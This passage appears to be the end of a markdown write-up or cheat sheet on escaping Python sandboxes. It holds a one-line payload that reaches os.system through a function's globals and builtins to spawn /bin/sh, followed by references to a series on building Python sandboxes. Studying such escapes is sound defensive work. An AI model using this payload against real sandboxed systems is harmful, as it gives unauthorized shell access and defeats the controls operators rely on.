from types import FunctionType
list(FunctionType(f.__code__).__globals__['__builtins__'].__dict__['__import__']('os').__dict__['system']('/bin/sh'))

```

## References
* [Building a Python Sandbox, Part 1](https://www.endgame.com/blog/building-python-sandbox-part-1)
* [Building a Python Sandbox, Part 2](https://www.endgame.com/blog/building-python-sandbox-part-2)
* [Building a Python Sandbox, Part 3](https://www.endgame.com/blog/building-python-sandbox-part-3)
* [Building a Python Sandbox, Part 4](https://www.endgame.com/blog/building-python-sandbox-part-4)
